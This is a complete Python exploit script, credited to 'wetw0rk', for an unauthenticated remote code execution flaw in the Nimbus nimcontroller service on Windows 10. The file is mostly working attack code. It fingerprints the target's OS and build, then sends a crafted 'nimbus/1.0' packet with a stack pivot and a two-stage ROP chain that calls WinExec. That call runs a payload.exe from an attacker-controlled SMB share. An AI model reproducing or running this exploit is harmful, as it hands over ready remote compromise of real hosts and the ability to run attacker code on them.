#!/usr/bin/env python
#
# Exploit Title   : Sing About Me, I'm Dying Of Thirst
# Date            : ??/??/19
# Author          : wetw0rk
# Software Link   : Good luck
#
# Description: Unauthenticated Nimbus nimcontroller RCE.
#
# Tested on:
#   Windows 10 [10.0.18362] (x64)
#

import os
import sys
import struct
import socket

TIMEOUT = 4

class nimbus_0day_exploitation():

  def __init__(self, rhost, rport):
    self.rhost  = rhost
    self.rport  = rport

    self.payload  = "cmd /c \\\\192.168.88.131\\SHARE\\payload.exe"
    self.payload += "\x00" * 50 # NEEDED

  def exploit(self):

    p_info("Launching unauthenticated nimbus RCE 0day")

    offset    = "\x0f" * 1033
    heap_flip = struct.pack('<Q', 0x000000014006fd3d) # pop rsp ; or al, 0x00 ; add rsp, 0x0000000000000448 ; ret

    alignrop   = "B" * 7                      # adjust for initial chain
    rop_chain  = self.first_stage_rop_chain() # stage1: get WinExec ptr, stack align
    rop_chain += "W" * 0x275                  # adjust for "add esp"
    rop_chain += "AA"                         # adjust for the second stage
    rop_chain += self.final_stage_rop_chain() # arg setup, and call
    rop_chain += "A" * (2200 - (              # alignment for payload
      len(rop_chain)
      )
    )

    p_info("ROP chain generated, payload: %s" % (self.payload))
    trigger = "\x10" * 5000

    exploit = offset + heap_flip + alignrop + rop_chain + self.payload + trigger

    packet = self.gen_probe(exploit)

    p_good("Sending evil buffer, R.I.P RIP - wetw0rk")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((self.rhost, self.rport))
    sock.send(packet)

  def first_stage_rop_chain(self):

    # RAX -> HMODULE GetModuleHandleA(
    #   ( RCX == *module ) LPCSTR lpModuleName,
    # );
    rop_gadgets  = [0x0000000140018c42] * 30  # ret
    rop_gadgets += [0x0000000140002ef6,       # pop rax ; ret
                    0x0000000000000000,       #
                    0x00000001400eade1,       # mov eax, esp ; add rsp, 0x30 ; pop r13 ; pop r12 ; pop rbp ; ret
                    0x32336c656e72656b,       # "kernel32.dll"
                    0x000000006c6c642e,       # ".dll"
                    0x0000000000000000,       #
                    0x0000000000000000,       #
                    0x0000000000000000,       #
                    0x0000000000000000]       #
    rop_gadgets += [0x0000000140018c42] * 10  # ret
    rop_gadgets += [0x00000001400b741b]       # xchg eax, ecx ; ret
    rop_gadgets += [0x00000001400daf39,       # pop rbx ; ret
                    0x000000014015e308,       # GetModuleHandleA (0x00000000014015E330-28)
                    0x00000001401017d4]       # lea rax, qword [rbx+0x08] ; add rsp, 0x30 ; pop rbx ; ret
    rop_gadgets += [0x0000000140018c42] * 10  # ret
    rop_gadgets += [0x00000001400d1161]       # call qword ptr [rax+20] ; add rsp, 0x40 ; pop rbx ; ret
    rop_gadgets += [0x0000000140018c42] * 17  # ret

    # RAX -> UINT WinExec(
    #   ( RCX == *payload           ) LPCSTR lpCmdLine,
    #   ( RDX == 0x0000000000000000 ) UINT   uCmdShow
    # );
    rop_gadgets += [0x0000000140131643,       # pop rcx ; ret
                    0x000000000005e800,       # [BASE ADDR + 0x5e800 == WinExec] (Windows 10 - 10.0.18362)
                    0x000000014006d8d8]       # add rax, rcx ; add rsp, 0x38 ; ret
    rop_gadgets += [0x0000000140018c42] * 15  # ret
    rop_gadgets += [0x0000000140111c09]       # xchg rax, r11 ; or al, 0x00 ; ret (BACKUP *WinExec)

    # RSP MUST BE A MULTIPLE OF 16 BYTES OTHERWISE CALL WILL FAIL ( Thanks Geluchat )
    rop_gadgets += [0x0000000140002ef6,       # pop rax ; ret
                    0x00000001401a3000,       # ( MEM_COMMIT | PAGE_READWRITE | MEM_IMAGE )
                    0x00000001400af237,       # pop rdi ; ret
                    0x0000000000000007,       # [RSP ALIGNMENT]
                    0x0000000140025dab]       # add esp, edi ; adc byte [rax], al ; add rsp, 0x0000000000000278 ; ret

    return ''.join(struct.pack('<Q', _) for _ in rop_gadgets)

  def final_stage_rop_chain(self):

    rop_gadgets  = [0x0000000140018c42] * 15  # ret
    rop_gadgets += [0x0000000140002ef6,       # pop rax ; ret
                    0x0000000000000000,       # [ZERO OUT RAX]
                    0x00000001400eade1,       # mov eax, esp ; add rsp, 0x30 ; pop r13 ; pop r12 ; pop rbp ; ret
                    0x0000000000000000,
                    0x0000000000000000,
                    0x0000000000000000,
                    0x0000000000000000,
                    0x0000000000000000,
                    0x0000000000000000]
    rop_gadgets += [0x0000000140018c42] * 15  # ret

    rop_gadgets += [0x0000000140131643,       # pop rcx ; ret
                    0x0000000000000249,       # [OFFSET TO PAYLOAD]
                    0x000000014006d8d8]       # add rax, rcx ; add rsp, 0x38 ; ret [controller.exe]
    rop_gadgets += [0x0000000140018c42] * 15  # ret
    rop_gadgets += [0x00000001400b741b]       # xchg eax, ecx ; ret
    rop_gadgets += [0x00000001400496a2,       # pop rdx ; ret
                    0x0000000000000000,       # uCmdShow
                    0x000000014011fefc]       # call r11 [TODO: RECOVER & AVOID CRASH]
    rop_gadgets += [0x0000000140018c42] * 16  # ret

    return ''.join(struct.pack('<Q', _) for _ in rop_gadgets)

  def gen_probe(self, buff):

    p_info("Generating evil nimbus probe, we're watching")

    packet_header = "nimbus/1.0 {:d} {:d}\r\n"
    packet_body = (
    "\x6d\x74\x79\x70\x65\x00\x37\x00\x34\x00\x31\x30\x30\x00\x63"
    "\x6d\x64\x00\x37\x00\x31\x35\x00\x64\x69\x72\x65\x63\x74\x6f"
    "\x72\x79\x5f\x6c\x69\x73\x74\x00\x73\x65\x71\x00\x31\x00\x32"
    "\x00\x30\x00\x74\x73\x00\x31\x00\x31\x31\x00\x31\x35\x32\x32"
    "\x37\x31\x33\x36\x30\x30\x00\x66\x72\x6d\x00\x37\x00\x31\x35"
    "\x00\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x2f\x31\x33\x33\x37"
    "\x00\x74\x6f\x75\x74\x00\x31\x00\x34\x00\x31\x38\x30\x00\x61"
    "\x64\x64\x72\x00\x37\x00\x30"
    )

    packet_args  = "directory\x00"
    packet_args += "7\x00{:d}\x00".format(len(buff)+1)
    packet_args += "{:s}".format(buff)

    packet_header = packet_header.format(
      len(packet_body),
      len(packet_args)
    )

    probe = packet_header + packet_body + packet_args

    return probe


class validate_vulnerability():

  def __init__(self, rhost, rport):
    self.client = "127.0.0.1/1337\x00"
    self.rhost  = rhost
    self.rport  = rport

    self.os_versions = [
      "10.0.18362",
    ]

    self.nm_versions = [
      "7.80 [Build 7.80.3132, Jun  1 2015]",
    ]

  def check_vulnerability(self):

    probe = self.generate_probe()

    p_info("Sending get_info probe to %s:%d" % (
      self.rhost, self.rport
      )
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    try:
      sock.connect((self.rhost, self.rport))
      sock.send(probe)
      self.parse_response(sock.recv(4096))
    except socket.timeout:
      p_error("Failed to connect to %s:%d" % (self.rhost, self.rport))
      sys.exit(-1)

  def parse_response(self, response):

    result = {
    "os_minor"  : "",
    "os_version": "",
    "version"   : "",
    }

    info   = response.decode().split('\x00')
    values = result.keys()

    for i in range(len(info)):
      if info[i] in values:
        result[info[i]] = info[i+3]

    p_info("Probe successful, detected: {:s}".format(
      result["os_minor"]
      )
    )

    if result["os_version"] not in self.os_versions:
      p_error("Exploit has not been tested against OS version")
      sys.exit(-1)
    p_good("Target OS appears to be exploitable")

    if result["version"] not in self.nm_versions:
      p_error("Exploit has not been tested against target build")
      sys.exit(-1)
    p_good("Nimbus build appears to be exploitable")

    return

  def generate_probe(self):

    packet_header = "nimbus/1.0 {:d} {:d}\r\n"
    packet_body   = (
    "mtype\x00"
    "7\x004\x00100\x00"
    "cmd\x00"
    "7\x009\x00"
    "get_info\x00"
    "seq\x00"
    "1\x002\x000\x00"
    "ts\x00"
    "1\x0011\x001571974657\x00"
    "frm\x00"
    )
    packet_body  += "7\x00{:d}\x00".format(
      len(self.client)
    )
    packet_body  += self.client
    packet_body  += (
    "tout\x00"
    "1\x004\x00180\x00"
    "addr\x00"
    "7\x000\x00"
    )
    packet_args   = (
    "interfaces\x00"
    "1\x002\x000\x00"
    "robot\x00"
    "7\x001\x00\x00"
    )

    packet_header = packet_header.format(
      len(packet_body),
      len(packet_args)
    )

    probe = packet_header + packet_body + packet_args

    return probe

def p_error(string):
  print("\033[1m\033[31m[-]\033[0m {:s}".format(string))

def p_info(string):
  print("\033[1m\033[94m[*]\033[0m {:s}".format(string))

def p_good(string):
  print("\033[1m\033[92m[+]\033[0m {:s}".format(string))

def main():

  try:
    rhost = sys.argv[1]
    rport = int(sys.argv[2])
  except:
    p_error("Usage: %s <rhost> <rport>" % sys.argv[0])
    sys.exit(-1)

  c = validate_vulnerability(rhost, rport)
  c.check_vulnerability()

  e = nimbus_0day_exploitation(rhost, rport)
  e.exploit()

main()
